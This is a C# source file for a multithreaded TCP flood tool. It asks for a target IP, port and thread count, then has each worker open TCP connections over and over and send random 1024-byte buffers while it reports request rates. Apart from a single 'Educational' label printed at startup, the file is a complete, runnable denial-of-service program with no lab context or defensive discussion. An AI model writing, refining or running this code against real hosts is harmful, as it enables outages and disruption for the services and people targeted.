using System.Net.Sockets;
class TcpFloodAttack
{
    private static int _requestCount = 0;
    private static bool _running = false;

    static async Task Main(string[] args)
    {
        Console.WriteLine("Educational TCP Flood Example");
        Console.WriteLine("insert IP:");
        string ip = Console.ReadLine()!;

        Console.WriteLine("Insert Port:");
        int port = int.Parse(Console.ReadLine()!);

        Console.WriteLine("insert Thread Num:");
        int threads = int.Parse(Console.ReadLine()!);

        Console.WriteLine("Press any key to start");
        Console.ReadKey();

        await StartAttack(ip, port, threads);
    }

    static async Task StartAttack(string ip, int port, int threadCount)
    {
        _running = true;
        var tasks = new Task[threadCount];

        for (int i = 0; i < threadCount; i++)
        {
            tasks[i] = Task.Run(() => FloodWorker(ip, port));
        }

        // Статистика
        _ = Task.Run(async () =>
        {
            while (_running)
            {
                Console.WriteLine($"requests sended: {Interlocked.Exchange(ref _requestCount, 0)}/sec");
                await Task.Delay(100);
            }
        });

        Console.WriteLine("press any key to stop...");
        Console.ReadKey();
        _running = false;

        await Task.WhenAll(tasks);
        Console.WriteLine("atak stoped");
    }

    static async Task FloodWorker(string ip, int port)
    {
        byte[] buffer = new byte[1024];
        Random rand = new Random();

        while (_running)
        {
            try
            {
                using var client = new TcpClient();
                client.SendTimeout = client.ReceiveTimeout = 1000;

                // Асинхронное подключение с таймаутом
                var connectTask = client.ConnectAsync(ip, port);
                var timeoutTask = Task.Delay(2000);

                if (await Task.WhenAny(connectTask, timeoutTask) == connectTask && client.Connected)
                {
                    // Отправка случайных данных
                    rand.NextBytes(buffer);
                    await client.GetStream().WriteAsync(buffer);
                    Interlocked.Increment(ref _requestCount);
                }
            }
            catch (Exception ex) when (
                ex is SocketException
                || ex is ObjectDisposedException
                || ex is IOException)
            {
                // Игнорируем ошибки соединения
            }
            await Task.Delay(1);
        }
    }
}